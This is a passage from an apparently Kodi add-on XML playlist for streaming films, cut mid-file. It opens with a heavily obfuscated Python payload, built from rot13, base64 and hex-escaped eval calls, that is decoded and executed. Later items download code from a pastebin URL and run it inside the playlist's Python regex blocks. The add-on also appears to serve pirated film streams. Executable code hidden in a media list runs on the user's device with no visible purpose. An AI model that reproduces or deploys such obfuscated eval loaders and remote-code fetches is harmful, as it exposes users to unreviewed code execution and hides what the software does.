zk2YjRiNTQzOTQ5NjEyZjRiNjY0ZjY1NDc2YjVhNDU0NTYzMzA0NjdhNDk3MjY2Nzk1YTM5NDYzMTYyNmI0ZDRmNmMzODU1N2E3NDU0Mzc0NTRiNjUzMTRkNzU1NTc2Njc0YTcwNWEyYjUzNDMzMzRhNzc3OTRiMmY3MzYyNDg0YTRjMzI1MTc2MzI0YjQ0NDE0ZjY2NDU2YTUwNDU1Nzc0NTM1OTRhNmI3OTczNjc2NjY4Njc1ODRmNzk0ZjM4NTU3ODcwMmY2OTQ3NTgzMDMzMmI0NDM3MzA3MTMwNzU2MzQxNzY0YzQzMmY1MzMzNDY0ODJiNTI1NDc4NTM2MjQ3NGU0ZjRmNDM1NTdhNTY1MzRmNTU0ODQ3NDc3NTQ1NDY2NTY3NGUzMzU3NDY3NTRhNzY1MDQxNDI1ODc5NmQzODMxMzQ1NDc3NmE1ODQ2NTc3Mzc3NmM2MzQ2MmI1YTRmNzk2MTM2Nzg1MDY1NDY0ZDYzNGQ1MjZmNjY0YjU0MzY1NTZlNzA0YzczNTI3NjZiNDMyYjRiNjY0OTU2MzU0OTYyNzM0MTUwMzI3MzY'
trinity =  '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'
oracle = 'EzMTU5NDc0YjczNGI0MzcxNDc3OTc5Njk2ZjRiNmY0YzU2NTc1MTMyNGQ1OTU1MzA2ZjJiNmY1ODZjNTEzNzU5NzM1NzRhN2E3MTQxMzY0YTRlNTM3MzMyNTM0MTc3NDEzMTU0MzU1NjMwMzI0Mjc2NzE0YTVhNTI2MjU4NGU2NDU2NTUzNTU1NzY1NjQyMzE3MTM2NzA3MTczNDE0NjY5Mzc1MjRmMzc2ZTQ1NTc0YjRkNzk3NDMyNmEzNjZmNDc1NjU2NDI0ZjRjNDQyZjM3NzE0YTcyNDI0NDcxNmM0MzQyMzU3NTQzNmM1NjQyNmM0YjVhNjE0YjRiNjc3NDU2NGEzMTU2NjY1NjU0NjI2YTQ1MzA3NTZlNjE2YzVhNTg2NTcxNDE0YjQ2MzE1MTU2NzAzMTUyNDY1NTYyNTY1YTU0MzI3ODZmNGE0NDYxNDczNjZjNzg1NjJmMzY2ODRiNTU2MzQ2N2E1OTc2NmQ2ZjZkNmM0ODMxNjc3MzU4NDY1NjQ5NTg0ZjRhNmE1YTRjMzYyYjRlNGEzMzcxNmM0YjUyNDY1NjQ4NzI0YTYxNzE1NzRlNDkzNzZlNmIzOTU2NGU1NjU2NTI3MTUwMzQ1NjJiNzk0NzMyNTI3NjcwNTM3NDU5Nzg3YTU1NjYzMTQyNGM3NTc4NmU0MTMwNTA0NjcyNmI2OTc2NGYzNTMyMmY1NjZjNTc1OTczNzM2NTYzNTc0ZTU0MzY1MTM4MzY0Mzc1NjczOTZiNDIzNjcxNzU3MTY0NzA1NjU4NTE0NzcxNDQ3NTRlNzg3MTcyNGM0MjU1NzM0MjJiNjk0MTQ1NTI0Nzc4NGY0YjVhNTI0NzJiMmI0YjQ0Nzk1MjU0NTYzNTZlNGI3MDRjNTY0Yzc1NmY3YTQzNjQzNzcxNTM3MTU2NjI0YjZlNTk1MDZkNTM2OTcxNmM3MDU2NmQ2NDQxNTY3MzY4NTY1NDZjNTM3MDRhNTQ3MDRiNTA3MTc1Mzk0ZTUyNTM3OTUzNDU3OTc1NzM0NjQ5NzY3Njc5NjIzNDU0MmY3MzUzNzk0ZTY4NTY1NjM0NjI0NDQ0NGE0MTJiNzg2ZjcxNzE1OTYzNGE2NjU1Mzk1MzQxNmQ1ODMxNGMzMzUyNjE2MzRmNzg0ZTUyMzE0OTRjMzMzNDcxNTA3OTc0NTU2ZDdhNmE2ZjJmNzU2NzM5NDQ1NzRhMzc1NjQ2NmM3MjYxNzI1YTZiNjE3MDczNTk2NzY0NTUyZjU2NGE1ODY4NjQ2ODRmNTE1Mzc4NDg1NTc3NzkzMzUxNzY1NTc1Nzk1MzJmMzQ0MjM2NGQ2ODc0NmI3ODczNmU0YzZmNTQ1OTUwMmI0YjczNTI0ZDRjNDk2ZTZiNTA2ODZkNDk3MjQ5Mzc0NzM0NTU2ZTU1Nzg0NjRmNzU0MjUwMzA0YTRmNmU2NTc3NjY3MTYxNmY2NDJmNmM0YTQyNDg2YTQzMzU3NDY1NzA2ZDQ1NDY3NTQ3NTgzNzc2NDU1NDY3NGU0YTRmNDE3NjQ2NTE0YjZiNGM3ODQxNmM3YTU5NzE0NjMzMzE1NzU2NTE2MjRhNmQzNjQ4MmY0MjU4Nzg1NzUzNzA3NTM4NDUyZjMyNGM3NDUwNmE0NzY3NmIyYjMwNjU0YjQyNTc0ZTYzMzI1OTU0NDI1ODY4NTI3NjQyNjU3OTRkNjQzMjQzNTg1ODRmNDc1NjRiNWE1YTRiNTg1YTRmNDkzMjQ5MzE2OTY4NjU1NDU4NDM3MTM4NDI2NTZkNDU2NDczNjM2ZDQzNTc0ZjMyNGE3MTc4Njk0YzZjNjQyZjY5MmY0Yzc2NzE0OTQyNDE2MjQxNGE3MzcxNzk0YzM0NzkyZjZkNTE1Njc3NGEzMzc3NDE0ZTRkNmI3NTM3NmU1YTQyMzM3MzZiMzk2YjdhMzc3ODRlNTE0NjQ3Nzk2NzU3NzU2NDcxNDQ2MTYxNzE3MjRhNDE3NjcxNTU3MTZiNzU2NzJiNmY2MTQ5NDIzNzU4Nzg0NDM0NTIzODc3NTc3ODU0NmY0ZjM2NDQ1YTQyNTg2YjY4Mzc2YjVhMzk1MTRlNmY0YjM0NTA2NDUzNzQ3Nzc2NzU3Mjc1NTU0YzY1NmM0OTQyNWE0ZDZlNTMzOTY5Njc1NDRjMzYzNzQxMzU1MTQ2MzQzMzY5NjY3MTc4NGU3ODU0NjI0YTUyMzY2YTRjNmY0ZTY3NjMyZjQxMzYzMjM0NzM1MzQzNGIzNDU1MzM0ZDU0NDg0YjRiNTQ1MDU2MmY1NjQ4MzIzOTMyNDUzMzcyNzY0YjU0Nzc3MDMxNTk0ZDZlNTY2ZTY5NTA0NzZkMzk0MjM2NzM2MTYxNTM0ZjQ3NTk0ZjY1Njk0YjJiNTIzMjQzNjY1OTZlNzY0YzU4NTE0ODU1NDI2NzY1Mzg3NzY0NjU2YzU1NDYzNDQ4NTkzNDc4NzQzMTJmNmY3MDRiMzU1MzM1NGU3ODUzNDg0ZjM1NWE1MjQ4NTk0Nzc2NDU0ODU4NTc3ODQ0NGU1NTQ2NjQ0ZDZkNzY0YjQ4MmY1MzRmNGU2ZDQzNzU2NzJiNDYzNjY5MzU0NjMxNTA1NzZhNzM1NjQ2MzEzOTU5NjkzMTM2MzU1NDMzNTY0YTY2NGM1NjU0NDc3MzU1MzU2NDQ3MzU2NDMzNjMzMTcxNjM3NTQ1NmE0Njc5MzY2OTcyNDc0ODMxMzE0YzMxNTgzMDQzNDQ2YTU4NTc0MjU1NjY0NTQyMmI1Njc2NTQ1ODU2NTg1NTcxMzc3OTQxMmI1YTU0MzE3NzUyMzI2ZjU5MzU2NjRkNjU1ODY0NDY0Yjc5NDMzMjQzN2E2YzcyNWE0NzM2NjE1NDM2NzgzMjc4NTAzNTczMmI3MDc5NTk2YTMzNjk2Yjc1NGI1ODc1NmE2NjU1NTQ2MTQ3Mzg1NTYxNmM2MzZmNjY3ODQzNjQ1NzUzNTE0NjM3NmU3MTczNDk0NTZjNTQyZjY4NTgzOTU3NjYzMzZhMmY0MjU4NzU0ZDQ1NjY1YTdhMmIzNjY4MzQ1MTQ4MzU2NDYyNzg2Zjc3NzMzNzU1NzQ2MzQ2MmI2YzUwMmI0YTcyMzA3MjM2NmQ0YTQzNzgzNTdhNzk0YTRmNTYyYjUyNmQ3ODMyNGU3MjQ2NjM3MzUwNjE1MDYyNzUzNzU1NjI1Mzc3NTU0YjM0NjMyZjU2NDk3MTY0NTQzMTMyN2E1NTU4NTU1YTRiMzc3MDY2MzQ0OTY0MzA1ODMxNDQ2ZTY3NTg3OTUwMzg2YTRlNzEzOTMwNjQzNTRmMmIzMTdhMmY1NzMxNmU2MjQxNjY2NjMwNjczNjQyMzE3NTY5NTIzNzY3Nzk1Mjc1NTI1MTYyMmIzMzVhMzc0MTU2NjU0Yzc2NGI2ODUwNzY2Mzc1MzE3MTRmNDkyYjY4NmMzOTZlNTI2ZTUwNjY1NzRiNjUzMzc1NDg0YzczMzY0NDZiNzk1OTczMzI1MjMzMzkzMzJiMmI3NjMzMzUzOTRkMzYzMTY1NmU2OTUyN2E1NDc2NmYzMjU0NWEzNzYyNmQ3OTUyNDIzMjQ2NzA0ZjQ4MmI3MzY4Njc1NzUwNmU3MDczMzA1NDYyNjQ1NzU5NzA1NDdhNTU2ZjcyNjI0YzY5MzE2ZTY4NjU2MTQ1MzA1NDZkNjE1MjM4MmY2OTU3N'
keymaker = 'zLmAmWvZmx2AGH4AGHlMwDkAQp3AwZ4AGV0MGMuAwp1Amp4ZzLmZQEvATV3AQD3AQH3AGZ3ZmR3AwMyAGt0LmWzAGLlLwMvATZ3AQZ2AwLmZGH1ATHmBGHjAGLmAQH3AGt1BQHjAzR2AGMyATZ1BGEyAwL1AGLlAQD0MGZ4AGNmAwWzAGp2BQL1AmZ0MGMyAwR2ZmL0ZmZ2BGZ2AmNlMwMxAGZ3AwZkAzR0MGD4ZmpmAGZ2AwR0MwEuAmt2AQH2ZmD3BGL0ZmDlLwD2ZmN0AQH5AwV1ZwH4A2R0Awp1AmN3LGEzA2RmAmIuAzV1AQp5AmR0AGp1AzR0AwEuAzH2AmHmZmD0Lmp1AwHmAwH4AmL3AQZjZmZ3ZmMwZmNmAmL4AzR0ZwD2ATDaPzgyrJ1un2IlVQ0tW1VeBJWDZSyyFGR1nvfmLaVmLIOOL2p5pyb5n0qdZQqWJUMQqKWgpxE6pKICZPgcGSAQoKAPrUyUJxqyGGOzZwufo3c3ZHjiX1uIMxMwAzggFKcyIF9IA1qSqH1kZJSAMx0inxtlDzWHZytlG1ynEJZ4Jx5KrH12E0WPMKSlJP9IZGMYF2p0A3OuZJcFYl9SHRceFQR3DwyvASIwL29uX1yIrwugG1udE29BHP9XFFf3GUABZR1cBH9mowqiJzWfF1A5oyWfoJLjG0WHHzkerUblAzAbL0IuZJ03Awp5X0VkA0IHoHk2o1MBHz84o2RiJIqODHj5n0EbGTM3IRACI0ADZ2EJGxgMFaDkD1SAqGIRG3IwJwuPI2gmH2MaIIb3p0pmAz5XFwOQEGubGPgzZKc1BGqhFmSxL0qkZ1bkBIICGTSLZUAjnKAyEKAbnJSeD1qhFJyeJTV0qT9gFaOcZ3qyDzWMMRVlomE0I3peZRWMIKV1Z0SUqKOuFT1HoQNmEHSDM0ACp3OZA3ZlIKR4Y3MLEGylI01aA0kOI0cTAl8mMJZ1BUcdoQACZ3SurzqKIHgwqQx4o2qeHzgbJJZ4Dyy5qUq0ZGM5LKSxH3OOpIIMoKHjJIcaJIcMF1OIA2IZp3yvpTcZIayUZwAUnKNeDz93HUAYZ25kHT5hovgHLJIaLJE4F29eER8mD251nQp2JRydDJgfG1MYLxx3D2cwoJLipHADX2SaA1ELAGMxE0EaDxS5ZFgfGGMUX3LirQShFHAXDzuUARIfZxkAFwAbA0Sipwu5n2D2DmEABGq1pwMxJJgWZxLkE24lY1qkEwODFISEEaZmDHVmnz1QovgjH1EQZ00eF01znJ9BFwp0nQp1Y1uuqwS6oxkLZJyvpIILZRA6IRcdqRynBKMnnHcxF2qbAP9jrxSSIaH2BTAcp3AmIxAIo29ZAKI6JzS6GIHjrGMGpHR1L3yQL2udq2Z1IxV4AT0eZmO1rGE6ET1VGRkGM3MPMFgXnKA6G2SfAaAYoTVio2WVG2LeFT4mBIyWAISlo0WHrxSSLxWvY0gbAIcEAGAEqvf5ZHHmomAdD29BnIEGA2SLMyympmShEyAAHQycrR1bqzj5ZF8mH01PpKxjGx5gJxp4o2b4MwSgqmOYnR9moxgEGKWLGKxlFvgSFFgYGxWGrvgLo3WuZKqnrwubpR04F1EVZ2WGLHA1Hz1dJIOUrzymIKDlXmASFxDiM3cMnvgQA0x0ZmO3Jyb1GPgypzydLH4iZT1PqGH5HF9IE3AXMwy0ZGSQDzp4LyEkIQEeMRSDoJkMLJqhIJAeYmqxp0y1MKOAI2IwA3c1Y0AQpRqIM0piMx1uDx1QAvguGHgDowNinUR4L2L0omuMoUSxp3yxLHSQAat5Lv8epzx2Exx1ozx2FmSwAxgUrHSbLGSeM3Z4pwqfpHScEII4LacaFUWvY3SCGJkhqGOQrQOfZx05Al9bZmuTpaWmISyDpx1PE1SUZTgwp25OrSOIFz5cBR1gZv8mHaMIY0VioJMADmADq0AAnH1UAJR4oJ1YE2uQEP9jGKHjHRA1D2ufFaAkL2qdXmN4GJgRX3OdLmxeLychFIH1qP8iEyOjY3S1plgRLJymBQquDmASpP9aFTtjYmELZQWuX3IKrzj0oJbiZ0biD2AgYmp0qxMEBTDmY2gGZ1peDyEioRMjIUAgnF9RARkmnKcwDxWOnUAcraMFnvgkAyqlDyqmHaOvFmyaFxSEYmu0GSELIaWXo2WyY2yurIWeJSA5E3SyoTMjDKW4Z2MaZJInnJcmFmquqRgwZ2WxA3SjAJZmq0EFrv9UEF91ZJgxq1EQnTRmZ2yUZ0kjqRuQAGqGEwqeATkwq3LlF2LkZ2fkGwqYZHV5LmqPLGVlZwymnGEgIJj1rTt3BF9cY21AX2ygXmt0LJxlXmxmFQuUIP9mq2ScJJg3pTxeBHWcZyyHnv9lD1EAqmIinwVinFgFoJflYmM6JF9mHKVmMHZmAmIyAF9UoHcuAzbloT5SMwyxZzx2nGpiAQueY3DlHT5DHxclHT1uAmqWDwAdo1qSZyRmA2uQBUSkL3qyIGD2BIWmFUp3LyHjpxuaDmZiqwARD1yeBIuMoGEBZUZiZT1wqateAlg4Y1uJHyuDX2kPGGplnGN1Y3uQHTy5AUAABJ0mBHujJTyQBRqipmE3nvgcFUZiY3quZF8iX3DiAzR0Y04iFl8iAKSYY3A5Z3pmAHf4G1yLJIcnGw09Wjc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWjchMJ8tCFOyqzSfXPqprQpmKUt2BIk4AmuprQWyKUt2AIk4AzIprQpmKUt3AIk4AmWprQL1KUt1Myk4AmAprQp0KUt3Zyk4ZwuprQLlKUt2BIk4AzIprQLkKUt3Z1k4AwAprQL5KUt2BIk4ZzIprQp1KUt2MIk4AwuprQL1KUt3BSk4AzAprQL5KUt2Ayk4AmyprQV4KUt2MSk4AzMprQplKUt3ZSk4AwuprQL1KUt3AIk4AmAprQV5KUtlBFpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQp0KUt3Zyk4AwyprQMyKUt2BIk4AmEprQp5KUtlL1k4ZwOprQquKUt2BIk4AzMprQMyKUtlBFpcVPftMKMuoPtaKUt3Z1k4AwyprQp4KUtlMIk4AwIprQMyKUt3Z1k4AmIprQplKUt2AIk4AJMprQpmKUt3ASk4AmWprQV4KUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzMprQplKUt2ZIk4AwAprQMwKUt2AIk4ZwyprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXDcyqzSfXTAioKOcoTHbrzkcLv5xMJAioKOlMKAmXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt2MIk4AwIprQMzWlxcXFjaCUA0pzyhMm4aYPqyrTIwWlxcPt=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/V9SqzX4.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>










<item>
<title>[COLOR gold]*[/COLOR] [COLOR darkgoldenrod]Cine [COLOR bisque]estrenoa cristal[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
 
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    pastebin0 = 'https://pastebin.com/u/Hectobo roba'
    pastebino0 = 'aHR0cHgfjgjgfjjnHFUFD=='
    pastebin0o = 'aHR0cHM6Ly8='
    pastebino = 'dsfrQWoPWWKDH='
    url = 'QnVzY2Fkb3JfcGlkZXBhbG9taXRhc19wb3N0'
    try:
      #page = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/DISTANCIA.D/superestrenos.distancia').read()
      #page = six.ensure_str(page)
      #page_data = page[2:].decode('base64')
      extraer = urllib_request.urlopen('http://bit.ly/superestrenos3').read()
      extraer = six.ensure_str(extraer)
    except:
      xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Imposible Conectar Con Base de Datos[/COLOR], 15000)")
      return [('[COLOR red]No Se Puede Acceder a la base...[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + [('[COLOR aqua]Solucion en Telegram: [COLOR white]@addonfestaycristal[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
    ExpresCristal = re.findall('(?s)<title>(.*?)<.*?genre>(.*?)<.*?year>(.*?)<.*?thumbnail>(.*?)<.*?fanart>(.*?)<.*?info>(.*?)<.*?<urlsolve>(.*?)<', extraer)
    return [('[COLOR aqua]Cristal Azul Resultados de: [COLOR white]Estrenos[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + ExpresCristal + [('[COLOR white]No hay más resultados...[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
